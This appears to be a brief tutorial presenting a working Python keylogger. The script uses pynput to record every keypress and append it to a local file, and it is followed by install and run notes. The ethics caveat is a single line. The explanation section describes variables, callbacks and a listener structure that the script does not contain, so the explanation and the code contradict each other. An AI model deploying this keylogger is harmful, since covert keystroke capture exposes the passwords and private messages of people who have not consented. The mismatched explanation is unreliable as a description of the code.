___SIMPLE KEYLOGGER__

=============
Instructions:
=============

Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers.

=============
Python Script:
=============

from pynput import keyboard 

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

=============
Explanation:
=============

Imports:
- ‘from pynput import keyboard’: Imports the necessary modules from the pynput library to handle keyboard events.

Log File:
- ‘log_file = ""keyfile.txt"”’: Specifies the file where keystrokes will be saved.

log Key:
'keys = []:’ Initializes a list to store keystrokes temporarily.

Key Press Callback:
- on_press(key): Function called whenever a key is pressed. It appends the key to the list and writes it to the file.


Start the Listener:
- with keyboard.Listener(on_press=on_press, on_release=on_release) as listener: Starts the keyboard listener to capture keystrokes.

 Key Notes::
=============

1. To install Pynput on terminal initiate --- “pip install pynput”

2. Run the program.
